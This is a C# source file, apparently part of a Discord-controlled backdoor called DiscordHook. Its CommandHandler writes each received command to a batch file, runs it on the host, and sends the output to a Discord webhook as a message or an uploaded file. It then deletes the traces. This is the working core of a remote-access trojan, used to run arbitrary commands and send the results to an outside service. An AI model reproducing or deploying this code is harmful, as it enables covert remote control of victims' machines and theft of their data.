using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using static DiscordHook.Utility;

namespace DiscordHook
{
    public static class CommandHandler
    {
        public static async Task HandleCmd(string command, string replyhook)
        {
            if (command == null || string.IsNullOrEmpty(command) || string.IsNullOrWhiteSpace(command)) await Task.CompletedTask;
            // ReSharper disable once PossibleNullReferenceException
            if (command[0] == '$')
            {
                
            }
            else            //shell commands
            {
                using var batfile = File.Create("shell.bat");
                await batfile.WriteAsync(Encoding.ASCII.GetBytes(command), 0, Encoding.ASCII.GetBytes(command).Length);
                batfile.Close();

                var shellproc = new Process
                {
                    StartInfo =
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        FileName = "shell.bat"
                    }
                };
                shellproc.Start();
                var outputstring = await shellproc.StandardOutput.ReadToEndAsync();
                shellproc.WaitForExit();
                if (outputstring.Length < 1990)
                {
                    await SendStringHook(outputstring, replyhook);
                    await Task.CompletedTask;
                }
                using var outputfile = File.Create("output.txt");
                await outputfile.WriteAsync(Encoding.ASCII.GetBytes(outputstring), 0,
                    Encoding.ASCII.GetBytes(outputstring).Length);
                outputfile.Close();
                await SendFileHook(replyhook, new FileInfo("output.txt"));
                File.Delete("shell.bat");
                File.Delete("output.txt");
            }
            await Task.CompletedTask;
        }
    }
}